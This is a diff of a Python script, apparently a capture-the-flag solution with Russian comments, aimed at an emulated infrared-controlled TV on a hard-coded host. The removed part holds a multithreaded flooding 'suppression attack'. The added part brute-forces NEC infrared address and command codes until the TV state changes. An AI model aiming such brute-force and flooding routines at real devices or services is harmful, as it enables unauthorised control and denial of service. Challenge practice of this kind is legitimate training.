@@ -156,89 +156,84 @@ def brute_force():
 if __name__ == "__main__":
     brute_force()
 
-
 import socket
-import time
 import requests
-from threading import Thread
+import json
+import time
 
-HOST = '154.57.164.72'
+# Данные с твоего скриншота
+HOST = "154.57.164.72"
 IR_PORT = 30241
-WEB_PORT = 32567
+STATE_URL = f"http://{HOST}:32567/state"
 
-BASE_URL = f"http://{HOST}:{WEB_PORT}"
-
-def generate_nec_raw(address, command):
-    inv_address = (~address) & 0xFF
-    inv_command = (~command) & 0xFF
-    bits = []
-    for b in [address, inv_address, command, inv_command]:
+def generate_nec_timings(address, command):
+    timings = [9000, 4500] 
+    
+    data = [
+        address,
+        address ^ 0xFF,
+        command,
+        command ^ 0xFF
+    ]
+    
+    for byte in data:
         for i in range(8):
-            bits.append((b >> i) & 1)
-    timings = [9000, 4500]
-    for bit in bits:
-        timings.append(560)
-        timings.append(1690 if bit == 1 else 560)
+            bit = (byte >> i) & 1
+            if bit == 0:
+                timings.extend([560, 560])
+            else:
+                timings.extend([560, 1690])
+                
     timings.append(560)
     return timings
 
-def test_new_formats():
-    # Тестируем команду 2 (0x02) и смену инпута (обычно 0x0f или 0x0b)
-    # 00ff02fd в децимле = 16712445
-    dec_val = int("00ff02fd", 16)
-    raw_t = generate_nec_raw(0, 2)
-    flipper_format = " ".join([f"+{raw_t[i]}" if i % 2 == 0 else f"-{raw_t[i]}" for i in range(len(raw_t))])
+def main():
+    print(f"Начинаем перебор для {HOST}...")
     
-    payloads = [
-        f"{dec_val}\n",
-        f"{flipper_format}\n",
-        f'{{"frequency": 38000, "pattern": {raw_t}}}\n'
-    ]
-    
-    print("[*] Проверка альтернативных стандартов бластера...")
-    for p in payloads:
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.connect((HOST, IR_PORT))
-                s.sendall(p.encode())
-                time.sleep(0.1)
-                res = requests.get(f"{BASE_URL}/api/state").json()
-                if res.get('digit_buffer') != "" or res.get('channel') != 1:
-                    print(f"[+] Найден верный формат: {p.strip()}")
-                    return True
-        except:
-            pass
-    return False
-
-def flood_worker(cmd_str):
-    # Воркер для непрерывного спама кодом в один поток
-    while True:
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.connect((HOST, IR_PORT))
-                while True:
-                    s.sendall(cmd_str.encode())
-                    time.sleep(0.005) # Максимальная скорость
-        except:
-            time.sleep(0.5) # Переподключение при обрыве
-
-def start_suppression_attack():
-    print("[*] Запуск атаки подавления (Flooding) со множества виртуальных телефонов...")
-    # Генерируем коды переключения на канал 2 (00ff02fd) и кнопку смены инпута (00ff0ffd)
-    targets = ["00ff02fd\n", "00ff0ffd\n"]
-    
-    threads = []
-    for t in targets:
-        for _ in range(10): # Открываем по 10 параллельных потоков на каждую команду
-            th = Thread(target=flood_worker, args=(t,), daemon=True)
-            th.start()
-            threads.append(th)
+    # Перебираем возможные адреса устройств
+    for address in [0x00, 0x04, 0x08, 0xFF]:
+        print(f"\nПробуем адрес устройства: {hex(address)}")
+        
+        for cmd in range(256):
+            timings = generate_nec_timings(address, cmd)
             
-    print("[*] Атака запущена. Воркеры спамят ИК-сигналами. Внимательно следи за сайтом телевизора!")
-    # Даем атаке поработать 30 секунд
-    time.sleep(30)
+            # Вариант 1: Отправка как JSON массив (самый частый для CTF)
+            payload = json.dumps(timings) + "\n"
+            
+            # Вариант 2: Строка через пробел (раскомментируй, если JSON не сработает)
+            # payload = " ".join(map(str, timings)) + "\n"
+            
+            # Вариант 3: Строка через запятую (раскомментируй, если предыдущие не сработают)
+            # payload = ",".join(map(str, timings)) + "\n"
+
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.settimeout(2)
+                    s.connect((HOST, IR_PORT))
+                    s.sendall(payload.encode())
+                    
+                # Пауза, чтобы эмулятор успел обработать ИК-сигнал
+                time.sleep(0.15) 
+                
+                resp = requests.get(STATE_URL, timeout=2)
+                if resp.status_code == 200:
+                    state = resp.json()
+                    
+                    # Выводим прогресс раз в 16 команд, чтобы не засорять консоль
+                    if cmd % 16 == 0:
+                        print(f"Текущая команда {hex(cmd)}. Вход: {state.get('input_name')} / Канал: {state.get('channel')}")
+                    
+                    # Проверяем, изменилось ли состояние по сравнению с дефолтным
+                    if state.get('input_name') != "TV" or state.get('channel') != 1:
+                        print(f"\n[+] УСПЕХ! Состояние изменилось!")
+                        print(f"[+] Адрес: {hex(address)}, Команда: {hex(cmd)}")
+                        print(f"[+] Новый стейт: {state}")
+                        print("Проверь экран в браузере, там должен появиться флаг.")
+                        return
+                        
+            except Exception as e:
+                print(f"[!] Ошибка отправки на адресе {hex(address)}, команде {hex(cmd)}: {e}")
+                time.sleep(0.5)
 
 if __name__ == "__main__":
-    if not test_new_formats():
-        print("[-] Альтернативные форматы в одиночном режиме не дали сдвига. Пробуем перебить трансляцию флудом...")
-        start_suppression_attack()
+    main()
